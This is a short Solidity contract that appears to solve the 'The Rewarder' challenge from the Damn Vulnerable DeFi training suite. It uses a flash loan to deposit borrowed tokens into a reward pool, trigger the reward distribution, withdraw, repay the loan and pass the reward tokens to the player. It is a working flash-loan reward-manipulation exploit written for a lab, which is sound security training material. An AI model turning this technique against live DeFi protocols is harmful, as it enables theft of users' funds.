// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {TheRewarderPool} from "./TheRewarderPool.sol";
import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import {RewardToken} from "./RewardToken.sol";
import "../DamnValuableToken.sol";

contract AttackerReward {
    TheRewarderPool private rewarder;
    FlashLoanerPool private pool;
    DamnValuableToken private dvt;
    RewardToken private rewardToken;
    address private player;

    constructor(address _pool, address _rewarder, address _dvt, address _rewardToken, address _player) {
        pool = FlashLoanerPool(_pool);
        rewarder = TheRewarderPool(_rewarder);
        dvt = DamnValuableToken(_dvt);
        player = _player;
        rewardToken = RewardToken(_rewardToken);
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        dvt.approve(address(rewarder), type(uint256).max);
        //assert(false);
        rewarder.deposit(amount);

        rewarder.distributeRewards();
        rewarder.withdraw(amount);
        dvt.transfer(address(pool), amount);
        rewardToken.transfer(player, rewardToken.balanceOf(address(this)));
    }
}
